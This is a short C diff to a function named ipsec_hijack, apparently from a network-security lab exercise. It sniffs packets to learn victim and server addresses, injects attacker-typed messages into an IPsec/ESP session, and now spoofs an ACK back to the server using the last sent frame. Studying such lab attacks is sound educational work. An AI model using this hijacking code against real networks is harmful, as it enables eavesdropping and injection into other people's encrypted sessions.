@@ -48,6 +48,7 @@ void ipsec_hijack(char *INTERFACE)
     *test_for_dissect = true;
     char *victim_ip = (char *)malloc(sizeof(char) * 64);
     char *server_ip = (char *)malloc(sizeof(char) * 64);
+    uint8_t *last_sent_pkt = (uint8_t *)malloc(BUFSIZE * sizeof(uint8_t));
     while (1)
     {
         /*you have to get the information from the packet you are sniffing*/
@@ -66,7 +67,7 @@ void ipsec_hijack(char *INTERFACE)
              * when receiver receive a packet from sender, receiver should reply a ACK packet to sender, then sender will know that
              * the packet has been received successfully. So we also have to reply a ACK to server, after we receive the secret.
              */
-            send_msg(&dev, &net, &esp, &txp, NULL);
+            send_ack(dev, net, esp, txp, last_sent_pkt);
             *state = WAIT_PKT;
             get_info(&dev, &net, &esp, &txp, state, victim_ip, server_ip, test_for_dissect);
         }
@@ -95,6 +96,9 @@ void ipsec_hijack(char *INTERFACE)
             /* send the message you input on the screen to server */
             send_msg(&dev, &net, &esp, &txp, str);
             *state = WAIT_SECRET;
+
+            bzero(last_sent_pkt, BUFSIZE); // store sent pkt for ack
+            memcpy(last_sent_pkt, dev.frame, dev.framelen);
         }
     }
 }
